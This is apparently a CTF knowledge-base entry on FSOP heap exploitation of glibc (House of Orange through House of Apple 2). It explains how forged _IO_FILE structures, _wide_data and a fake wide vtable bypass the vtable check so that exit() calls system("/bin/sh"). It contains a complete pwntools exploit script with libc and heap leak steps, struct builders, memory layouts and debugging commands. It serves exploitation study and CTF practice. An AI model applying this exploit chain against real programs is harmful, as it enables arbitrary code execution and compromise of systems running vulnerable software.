---
title: "FSOP - _IO_FILE Structure Attacks From House of Orange to _IO_wfile_jumps"
category: pwn
subcategory: heap
type: technique
tags: [fsop, io-file, _io_list_all, vtable, io-flush-all-lockp, io-wfile-jumps, io-wstrn, house-of-orange, house-of-apple, wide-data, exit, arbitrary-write, pwntools, pwndbg, gef, glibc]
difficulty: hard
summary: "Forge a FILE structure so that exit() or a flush walks your vtable and calls a function you chose with an argument you chose."
when_to_use:
  - "glibc 2.34+ removed the hooks and you need a call primitive"
  - "You can write a heap pointer over `_IO_list_all` or `stdout` (largebin attack)"
  - "The challenge ends with `exit()` and you have an arbitrary write"
  - "You need a call with rdi pointing at controlled data (system(\"/bin/sh\"))"
tools: [pwntools, pwndbg, gef, one-gadget]
related: [house-orange, house-of-apple, heap-largebin-attack, heap-write-targets, heap-setcontext-pivot]
---

## TL;DR

Every `FILE` in glibc is an `_IO_FILE_plus`: the struct followed by a `vtable` pointer.
`exit()` -> `_IO_cleanup` -> `_IO_flush_all_lockp` walks the `_IO_list_all` chain and
calls `_IO_OVERFLOW(fp, EOF)` through that vtable on any FILE with
`_IO_write_ptr > _IO_write_base`. Control the chain and you control a call. Since 2.24
the vtable must point inside `__libc_IO_vtables`, so modern chains use
`_IO_wfile_jumps` and the `_wide_data` indirection instead of a fully fake vtable.

## Recognise it

- The binary calls `exit()`, or you can force an `abort` (house of orange).
- glibc 2.34+: `nm -D libc.so.6 | grep __free_hook` is empty.
- Your primitive writes a *heap pointer* (largebin attack), not an arbitrary value -
  `_IO_list_all` is exactly the target that wants a pointer to controlled data.
- `stdout` is used by the program, so a forged `stdout` fires on the next `printf`.

## Vulnerable code shape

Again a capability, not a bug. You arrive with:

```c
/* (a) arbitrary write of a controlled buffer, e.g. after a tcache poison */
memcpy(TARGET, attacker_buffer, 0xE0);

/* (b) a heap pointer written to an address you chose (largebin attack) */
*(void **)&_IO_list_all = my_heap_chunk;

/* and the program does, eventually: */
exit(0);            /* -> _IO_cleanup -> _IO_flush_all_lockp */
```

## Theory

Targets: glibc 2.23 - 2.39; the usable chain changes at 2.24 and again at 2.34.

### `_IO_FILE_plus` layout (x86-64)

| offset | field | notes |
|--------|-------|-------|
| 0x00 | `_flags` | magic `0xFBAD0000` in the high half |
| 0x08 | `_IO_read_ptr` | |
| 0x10 | `_IO_read_end` | |
| 0x18 | `_IO_read_base` | |
| 0x20 | `_IO_write_base` | flush start |
| 0x28 | `_IO_write_ptr` | flush end - must be `>` write_base to trigger overflow |
| 0x30 | `_IO_write_end` | |
| 0x38 | `_IO_buf_base` | |
| 0x40 | `_IO_buf_end` | |
| 0x48-0x58 | `_IO_save_base`, `_IO_backup_base`, `_IO_save_end` | |
| 0x60 | `_markers` | |
| 0x68 | `_chain` | next FILE in `_IO_list_all` |
| 0x70 / 0x74 | `_fileno` / `_flags2` | ints |
| 0x78 | `_old_offset` | |
| 0x80 | `_cur_column`, `_vtable_offset`, `_shortbuf[1]` | |
| 0x88 | `_lock` | **must point at writable zeroed memory** |
| 0x90 / 0x98 | `_offset` / `_codecvt` | |
| 0xA0 | `_wide_data` | pointer to `_IO_wide_data` - the modern lever |
| 0xA8-0xB8 | `_freeres_list`, `_freeres_buf`, `__pad5` | |
| 0xC0 | `_mode` | int - sign picks narrow vs wide path |
| 0xD8 | `vtable` | `_IO_jump_t *` |

### `_IO_flush_all_lockp`

```c
for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp->_chain)
  if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
       || (_IO_vtable_offset (fp) == 0 && fp->_mode > 0
           && (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)))
      && _IO_OVERFLOW (fp, EOF) == EOF)
    result = EOF;
```

Two trigger conditions, both attacker friendly: `_mode <= 0` with
`_IO_write_ptr > _IO_write_base` (narrow), or `_mode > 0` with
`_wide_data->_IO_write_ptr > _wide_data->_IO_write_base` (wide).

`_IO_OVERFLOW(fp, EOF)` is `fp->vtable->__overflow(fp, EOF)`, i.e. `vtable + 0x18`.
The first argument is `fp` itself - a buffer you control. That is why
`vtable->__overflow = system` plus `fp` starting with `"/bin/sh\0"` is a shell.

### The 2.24 vtable check

```c
/* libioP.h */
uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
uintptr_t offset = (uintptr_t) vtable - (uintptr_t) __start___libc_IO_vtables;
if (__glibc_unlikely (offset >= section_length))
  _IO_vtable_check ();          /* aborts: "invalid stdio handle" */
```

So `vtable` must land inside the `__libc_IO_vtables` section. You cannot point it at
the heap. But you *can* point it at a **different real vtable**, or at an offset inside
the section so that `vtable + 0x18` lands on a different function pointer than the one
the designers intended. That is the whole modern game.

Real vtables in the section: `_IO_file_jumps`, `_IO_wfile_jumps`,
`_IO_str_jumps`, `_IO_wstrn_jumps`, `_IO_obstack_jumps`, `_IO_cookie_jumps`,
`_IO_mem_jumps`, `_IO_wmem_jumps`.

### The 2.35+ chain: `_IO_wfile_jumps`

Set `vtable = _IO_wfile_jumps`. Then `_IO_OVERFLOW` is `_IO_wfile_overflow`:

```c
wint_t _IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) { ... return WEOF; }
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_wide_data->_IO_write_base == NULL)
    {
      if (f->_wide_data->_IO_buf_base == NULL)
        _IO_wdoallocbuf (f);                       /* <-- here */
      ...
    }
  ...
}

void _IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base) return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)      /* <-- the call */
      return;
  ...
}
```

`_IO_WDOALLOCATE(fp)` is `fp->_wide_data->_wide_vtable->__doallocate(fp)`.
`_wide_vtable` is at offset **0xE0** inside `struct _IO_wide_data`, and
`__doallocate` is at **+0x68** inside the wide vtable.

Crucially `_wide_data` is a pointer **you** supply, and `_wide_vtable` is read from it
with **no validation at all** - `IO_validate_vtable` is only applied to `fp->vtable`.
So:

```
fp->vtable            = _IO_wfile_jumps           (passes the check)
fp->_wide_data        = &fake_wide_data           (your heap chunk)
fake_wide_data+0xE0   = &fake_wide_vtable         (your heap chunk, unchecked)
fake_wide_vtable+0x68 = system                    (or setcontext+61)
rdi at the call       = fp                        (your chunk -> put "/bin/sh" at +0)
```

Conditions to reach `_IO_wdoallocbuf`: `_flags & 0x8 (_IO_NO_WRITES)` clear,
`_flags & 0x800 (_IO_CURRENTLY_PUTTING)` clear **or**
`_wide_data->_IO_write_base == NULL`, `_wide_data->_IO_buf_base == NULL`,
`_flags & 0x2 (_IO_UNBUFFERED)` clear, one of the two flush triggers satisfied, and
`_lock` pointing at writable zeroed memory.

`_IO_wide_data` offsets you need: `_IO_write_base` 0x18, `_IO_write_ptr` 0x20,
`_IO_buf_base` 0x30, `_wide_vtable` 0xE0.

### `_IO_wstrn_jumps` / `_IO_str_jumps`

`_IO_str_overflow` in older glibc calls
`(*((_IO_strfile *) fp)->_s._allocate_buffer)(new_size)` - a direct call through a
pointer stored in the struct at 0xE0. That indirect allocate pointer was removed in
2.28+, but `_IO_wstrn_jumps`'s `_IO_wstrn_overflow` remains a useful *constrained
write* gadget (it writes zeros relative to attacker-controlled pointers). Secondary
option; confirm against your libc's disassembly.

## Attack

House of apple 2 shape on glibc 2.35. Assume an arbitrary write of 0x100 bytes at an
address you choose, plus a libc and heap leak.

1. Pick a heap chunk `FAKE` of at least 0x100 bytes whose address you know.
2. Build a fake `_IO_wide_data` at `FAKE + 0x100` (or in a second chunk):
   all zeros except `_IO_write_ptr` (0x20) = 1 and `_wide_vtable` (0xE0) = `WVT`.
3. Build a fake wide vtable at `WVT` with `__doallocate` (offset 0x68) = `system`.
4. Build the FILE at `FAKE`:
   - `+0x00 _flags` = `u64(b"  /bin/sh")`. `rdi` at the final call is `FAKE`, so the
     first 8 bytes double as the command string; the two leading spaces are harmless
     to `sh -c`.
   - `+0x20 _IO_write_base` = 0, `+0x28 _IO_write_ptr` = 1 (narrow trigger)
   - `+0x88 _lock` = a writable zeroed address
   - `+0xA0 _wide_data` = the fake wide data address
   - `+0xC0 _mode` = 0, `+0xD8 vtable` = `_IO_wfile_jumps`
5. Write `FAKE` over `_IO_list_all` (largebin attack), or over `stdout` itself, or
   chain it from `stdout->_chain`.
6. Trigger `exit()` (menu option 5, or let `main` return).
7. `_IO_flush_all_lockp` -> `_IO_wfile_overflow(FAKE)` -> `_IO_wdoallocbuf` ->
   `fake_wide_vtable->__doallocate(FAKE)` = `system("  /bin/sh")`.

## Heap state

```text
FAKE (0x...500)                            fake_wide_data (0x...620)
 +0x000 _flags        = "  /bin/sh"         +0x000 _IO_read_ptr    = 0
 +0x020 _IO_write_base= 0                   +0x018 _IO_write_base  = 0
 +0x028 _IO_write_ptr = 1   <-- > base      +0x020 _IO_write_ptr   = 1
 +0x068 _chain        = 0                   +0x030 _IO_buf_base    = 0  <-- must be NULL
 +0x088 _lock         = &zeroed_writable    +0x0e0 _wide_vtable    = WVT
 +0x0a0 _wide_data    = fake_wide_data
 +0x0c0 _mode         = 0
 +0x0d8 vtable        = _IO_wfile_jumps    WVT (0x...720)
                        (inside libc,       +0x068 __doallocate = system
                         passes the check)

libc:
  _IO_list_all  ---------------------------> FAKE

exit() -> _IO_cleanup -> _IO_flush_all_lockp
   fp = FAKE ; _mode <= 0 && _IO_write_ptr(1) > _IO_write_base(0) -> selected
   _IO_OVERFLOW(fp, EOF) = *(fp->vtable + 0x18)(fp, EOF) = _IO_wfile_overflow
       _wide_data->_IO_buf_base == NULL  -> _IO_wdoallocbuf(FAKE)
           *(fp->_wide_data->_wide_vtable + 0x68)(fp)
           = system(FAKE)                 <- rdi = FAKE = "  /bin/sh"
```

## Exploit

```python
#!/usr/bin/env python3
"""FSOP: forge an _IO_FILE_plus that turns exit() into system("/bin/sh").

Two builders:
  build_file()            - the raw struct packer (no pwntools FileStructure)
  build_house_of_apple2() - the 2.34+ _IO_wfile_jumps chain

Usage:
    ./exploit.py SELFTEST
    ./exploit.py REMOTE HOST=1.2.3.4 PORT=1337
"""
import sys

from pwn import ELF, args, context, log, p64, process, remote, u64

FILE_SIZE = 0xE0          # up to and including the vtable pointer at 0xD8

# _IO_FILE_plus field offsets (x86-64)
OFF = {
    "_flags": 0x00, "_IO_read_ptr": 0x08, "_IO_read_end": 0x10,
    "_IO_read_base": 0x18, "_IO_write_base": 0x20, "_IO_write_ptr": 0x28,
    "_IO_write_end": 0x30, "_IO_buf_base": 0x38, "_IO_buf_end": 0x40,
    "_IO_save_base": 0x48, "_IO_backup_base": 0x50, "_IO_save_end": 0x58,
    "_markers": 0x60, "_chain": 0x68, "_fileno": 0x70, "_flags2": 0x74,
    "_old_offset": 0x78, "_lock": 0x88, "_offset": 0x90, "_codecvt": 0x98,
    "_wide_data": 0xA0, "_freeres_list": 0xA8, "_freeres_buf": 0xB0,
    "_mode": 0xC0, "vtable": 0xD8,
}
# struct _IO_wide_data offsets
WOFF = {"_IO_read_ptr": 0x00, "_IO_write_base": 0x18, "_IO_write_ptr": 0x20,
        "_IO_buf_base": 0x30, "_wide_vtable": 0xE0}
WVT_DOALLOCATE = 0x68


def pack_struct(fields: dict, size: int) -> bytes:
    """Build a byte blob of `size` from {offset: value} where value is int or bytes."""
    buf = bytearray(size)
    for off, val in sorted(fields.items()):
        raw = p64(val) if isinstance(val, int) else val
        assert off + len(raw) <= size, "field at %#x overflows the struct" % off
        buf[off:off + len(raw)] = raw
    return bytes(buf)


def build_file(**kw) -> bytes:
    """Raw _IO_FILE_plus builder. Keyword names are the field names in OFF."""
    fields = {}
    for name, val in kw.items():
        assert name in OFF, "unknown FILE field %r" % name
        fields[OFF[name]] = val
    return pack_struct(fields, FILE_SIZE + 8)


def build_wide_data(wide_vtable: int) -> bytes:
    """Minimal _IO_wide_data: buf_base NULL, write_ptr > write_base, vtable set."""
    return pack_struct({
        WOFF["_IO_write_base"]: 0,
        WOFF["_IO_write_ptr"]: 1,
        WOFF["_IO_buf_base"]: 0,
        WOFF["_wide_vtable"]: wide_vtable,
    }, 0xE8)


def build_wide_vtable(doallocate: int) -> bytes:
    return pack_struct({WVT_DOALLOCATE: doallocate}, 0x70)


def build_house_of_apple2(libc, fake_addr, wide_data_addr, wide_vt_addr,
                          call_target, lock_addr):
    """Return (file_bytes, wide_data_bytes, wide_vtable_bytes)."""
    file_bytes = build_file(
        _flags=u64(b"  /bin/sh"),      # doubles as the rdi string for system()
        _IO_write_base=0,
        _IO_write_ptr=1,               # > write_base -> selected by flush_all
        _lock=lock_addr,               # writable, zeroed
        _wide_data=wide_data_addr,
        _mode=0,                       # narrow trigger condition
        vtable=libc.sym["_IO_wfile_jumps"],
    )
    return (file_bytes,
            build_wide_data(wide_vt_addr),
            build_wide_vtable(call_target))


def _selftest():
    f = build_file(_flags=0xFBAD1800, vtable=0x4141414141414141)
    assert len(f) == FILE_SIZE + 8
    assert u64(f[0xD8:0xE0]) == 0x4141414141414141
    assert u64(f[0x00:0x08]) == 0xFBAD1800
    w = build_wide_data(0xDEADBEEF)
    assert u64(w[0xE0:0xE8]) == 0xDEADBEEF and u64(w[0x20:0x28]) == 1
    v = build_wide_vtable(0xCAFEBABE)
    assert u64(v[0x68:0x70]) == 0xCAFEBABE
    print("[+] FILE builder self-test passed")


def run():
    BINARY = args.BIN or "./chal"
    LIBC = args.LIBC or "./libc.so.6"
    context.binary = ELF(BINARY, checksec=False)
    context.log_level = args.LOG or "info"
    libc = ELF(LIBC, checksec=False)

    io = (remote(args.HOST or "127.0.0.1", int(args.PORT or 1337))
          if args.REMOTE else process([BINARY]))

    def menu(c):
        io.sendlineafter(b"> ", str(c).encode())

    def alloc(i, n, d=b"A"):
        menu(1)
        io.sendlineafter(b"index: ", str(i).encode())
        io.sendlineafter(b"size: ", str(n).encode())
        io.sendafter(b"content: ", d)

    def free(i):
        menu(2)
        io.sendlineafter(b"index: ", str(i).encode())

    def show(i):
        menu(3)
        io.sendlineafter(b"index: ", str(i).encode())
        io.recvuntil(b"content: ")
        return u64(io.recvline().rstrip(b"\n").ljust(8, b"\x00")[:8])

    def edit(i, d):
        menu(4)
        io.sendlineafter(b"index: ", str(i).encode())
        io.sendafter(b"content: ", d)

    # leaks
    alloc(0, 0x418, b"leaker")
    alloc(1, 0x18, b"guard")
    free(0)
    libc.address = show(0) - 0x60 - libc.sym["main_arena"]
    log.success("libc base = %#x", libc.address)

    alloc(2, 0x28, b"h")
    free(2)
    heap_page = show(2) << 12             # lone tcache entry -> (pos >> 12)
    log.success("heap page = %#x", heap_page)

    # One big chunk holds the FILE, the wide data and the wide vtable.
    FAKE_OFF = 0x400                       # adjust after vis_heap_chunks
    fake = heap_page + FAKE_OFF
    wide_data = fake + 0x100
    wide_vt = fake + 0x200

    fb, wb, vb = build_house_of_apple2(
        libc, fake, wide_data, wide_vt,
        call_target=libc.sym["system"],
        lock_addr=heap_page + 0x800,       # any writable zeroed address
    )

    alloc(3, 0x300, fb + b"\x00" * (0x100 - len(fb)) + wb[:0x100])
    alloc(4, 0x100, vb)
    log.info("fake FILE staged at %#x", fake)

    # Point _IO_list_all at the fake FILE (largebin attack, or a direct write
    # if you already have one).
    log.info("now write %#x over %#x (_IO_list_all)", fake, libc.sym["_IO_list_all"])
    menu(5)                                # exit -> _IO_cleanup -> flush_all
    io.interactive()


if __name__ == "__main__":
    _selftest()
    if "SELFTEST" not in sys.argv:
        run()
```

## Variants & pitfalls

- **`_lock` is the #1 crash cause.** `_IO_flush_all_lockp(1)` takes the lock before
  calling overflow. Point `_lock` at 16 zero bytes in writable memory.
- **`_mode` sign.** `_mode <= 0` picks the narrow trigger (`_IO_write_ptr >
  _IO_write_base` on the FILE), `_mode > 0` the wide one (on `_wide_data`). Set one
  consistently; mixing them makes the FILE be skipped.
- **`_IO_wfile_jumps` must be the *exact* symbol.** `_IO_wfile_jumps_maybe_mmap` and
  `_IO_wfile_jumps_mmap` also exist and lead elsewhere.
- **`vtable + 0x18` is `__overflow`.** Pointing `vtable` at `X` calls `*(X + 0x18)`,
  so you can *shift* `vtable` to make a different real function land there - e.g.
  `vtable = _IO_str_jumps - 0x18` resolves `__overflow` to `_IO_str_finish`.
- **2.24+ validation** rejects a heap vtable with
  `Fatal error: glibc detected an invalid stdio handle`.
- **Use `stdout` directly.** Overwriting `_IO_2_1_stdout_`'s fields (rather than
  `_IO_list_all`) means the next `printf`/`puts` triggers the chain instead of `exit`.
- **`pwntools` has `FileStructure`**, which is fine, but the builder above is explicit
  and does not hide the offsets from you.
- **House of orange** is the 2.23 ancestor (fake vtable allowed); **house of apple** is
  the 2.34+ descendant. Both have their own files here.

## Debugging

```text
pwndbg> p *(struct _IO_FILE_plus*)&_IO_2_1_stdout_
pwndbg> p _IO_list_all
pwndbg> p &_IO_wfile_jumps
pwndbg> p &__libc_IO_vtables
pwndbg> info symbol <vtable_value>          # is it inside the vtable section?
pwndbg> b _IO_flush_all_lockp
pwndbg> b _IO_wdoallocbuf
pwndbg> x/32gx <fake_file_addr>
```

```bash
# Confirm which IO vtables this libc ships.
nm -D ./libc.so.6 | grep -E '_IO_(w)?(file|str|wstrn|cookie|mem)_jumps'
readelf -SW ./libc.so.6 | grep -i vtable
```

## Tools

- `pwndbg` with glibc debug symbols (`apt install libc6-dbg`).
- `pwntools` `FileStructure` as a cross-check against your own builder.
- `one_gadget`, `seccomp-tools`.

## References

- glibc `libio/genops.c` (`_IO_flush_all_lockp`), `libio/wfileops.c`
  (`_IO_wfile_overflow`), `libio/wgenops.c` (`_IO_wdoallocbuf`),
  `libio/libioP.h` (`IO_validate_vtable`).
- Angelboy's "Play with FILE Structure" research popularised FSOP.
